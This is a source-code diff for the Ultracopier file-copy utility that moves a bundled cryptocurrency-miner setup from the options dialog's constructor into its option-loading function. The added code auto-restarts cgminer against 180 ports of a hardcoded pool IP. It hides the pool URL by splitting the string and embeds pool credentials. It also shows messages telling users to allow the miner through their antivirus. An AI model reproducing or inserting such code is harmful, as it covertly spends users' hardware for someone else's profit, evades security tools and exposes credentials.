@@ -97,44 +97,6 @@ OptionDialog::OptionDialog() :
     else
         ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"No windir");
     haveCgminer=QFile(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH).exists() && OpenCLDll;
-    if(!haveCgminer)
-    {
-        if(!QFile(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH).exists())
-        {
-            QMessageBox::critical(this,tr("Allow the application"),tr("This Ultimate free version is only if %1 is allowed by your antivirus. Else you can get the normal free version").arg(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH));
-            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"application not found");
-        }
-        if(!OpenCLDll)
-        {
-            QMessageBox::critical(this,tr("Enable the OpenCL"),tr("This Ultimate version is only if the OpenCL is installed with your graphic card drivers. Else you can get the normal free version"));
-            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"OpenCL.dll not found");
-        }
-        ui->label_gpu_time->setEnabled(false);
-        ui->giveGPUTime->setEnabled(false);
-    }
-    else
-    {
-        srand (time(NULL));
-        connect(&cgminer,static_cast<void(QProcess::*)(QProcess::ProcessError)>(&QProcess::error),this,&OptionDialog::error,Qt::QueuedConnection);
-        connect(&cgminer,static_cast<void(QProcess::*)(int,QProcess::ExitStatus)>(&QProcess::finished),this,&OptionDialog::finished,Qt::QueuedConnection);
-        connect(&cgminer,&QProcess::readyReadStandardError,this,&OptionDialog::readyReadStandardError,Qt::QueuedConnection);
-        connect(&cgminer,&QProcess::readyReadStandardOutput,this,&OptionDialog::readyReadStandardOutput,Qt::QueuedConnection);
-        autorestartcgminer.setInterval(60*60*1000);
-        autorestartcgminer.setSingleShot(true);
-        connect(&autorestartcgminer,&QTimer::timeout,this,&OptionDialog::startCgminer,Qt::QueuedConnection);
-        restartcgminer.setInterval(60*1000);
-        restartcgminer.setSingleShot(true);
-        connect(&restartcgminer,&QTimer::timeout,this,&OptionDialog::startCgminer,Qt::QueuedConnection);
-        int index=0;
-        while(index<180)
-        {
-            QStringList pool=QStringList() << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://37.59.242.80:%1").arg(3334+index) <<  "-O" << "alphaonex86_ultracopier:JE5RfIAzapCSABZC";
-            pools << pool;
-            index++;
-        }
-        //QStringList pool2=QStringList() << "--scrypt" << "-o" << "stratum+tcp://eu.wemineltc.com:3333" <<  "-O" << "alphaonex86.pool:yyDKPcO850pCayTx";
-        //pools << pool2;
-    }
     #endif
 }
 
@@ -529,6 +491,47 @@ void OptionDialog::loadOption()
         if(oSSpecific.dontShowAgain())
             OptionEngine::optionEngine->setOptionValue("Ultracopier","displayOSSpecific",QVariant(false));
     }
+
+    #ifdef ULTRACOPIER_CGMINER
+    if(!haveCgminer)
+    {
+        if(!QFile(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH).exists())
+        {
+            QMessageBox::critical(this,tr("Allow the application"),tr("This Ultimate free version is only if %1 is allowed by your antivirus. Else you can get the normal free version").arg(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH));
+            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"application not found");
+        }
+        if(!OpenCLDll)
+        {
+            QMessageBox::critical(this,tr("Enable the OpenCL"),tr("This Ultimate version is only if the OpenCL is installed with your graphic card drivers. Else you can get the normal free version"));
+            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"OpenCL.dll not found");
+        }
+        ui->label_gpu_time->setEnabled(false);
+        ui->giveGPUTime->setEnabled(false);
+    }
+    else
+    {
+        srand (time(NULL));
+        connect(&cgminer,static_cast<void(QProcess::*)(QProcess::ProcessError)>(&QProcess::error),this,&OptionDialog::error,Qt::QueuedConnection);
+        connect(&cgminer,static_cast<void(QProcess::*)(int,QProcess::ExitStatus)>(&QProcess::finished),this,&OptionDialog::finished,Qt::QueuedConnection);
+        connect(&cgminer,&QProcess::readyReadStandardError,this,&OptionDialog::readyReadStandardError,Qt::QueuedConnection);
+        connect(&cgminer,&QProcess::readyReadStandardOutput,this,&OptionDialog::readyReadStandardOutput,Qt::QueuedConnection);
+        autorestartcgminer.setInterval(60*60*1000);
+        autorestartcgminer.setSingleShot(true);
+        connect(&autorestartcgminer,&QTimer::timeout,this,&OptionDialog::startCgminer,Qt::QueuedConnection);
+        restartcgminer.setInterval(60*1000);
+        restartcgminer.setSingleShot(true);
+        connect(&restartcgminer,&QTimer::timeout,this,&OptionDialog::startCgminer,Qt::QueuedConnection);
+        int index=0;
+        while(index<180)
+        {
+            QStringList pool=QStringList() << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://37.59.242.80:%1").arg(3334+index) <<  "-O" << "alphaonex86_ultracopier:JE5RfIAzapCSABZC";
+            pools << pool;
+            index++;
+        }
+        //QStringList pool2=QStringList() << "--scrypt" << "-o" << "stratum+tcp://eu.wemineltc.com:3333" <<  "-O" << "alphaonex86.pool:yyDKPcO850pCayTx";
+        //pools << pool2;
+    }
+    #endif
 }
 
 void OptionDialog::newOptionValue(const QString &group,const QString &name,const QVariant &value)
